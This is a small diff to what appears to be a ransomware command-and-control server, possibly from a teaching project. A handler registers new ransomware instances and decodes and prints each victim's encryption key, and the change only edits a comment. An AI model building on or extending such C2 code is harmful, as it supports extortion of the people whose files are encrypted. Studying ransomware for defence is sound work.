@@ -21,7 +21,7 @@ class CNC(CNCBase):
     def post_new(self, path:str, params:dict, body:dict)->dict:
         # used to register new ransomware instance
         
-        # printing the key in the cnc terminal
+        # printing the key in the cnc terminal to facilitate the debugging
         print(body)
         key = str(base64.b64decode(body['key']), 'utf8')
         print(f"\nKEY = {key}\n")
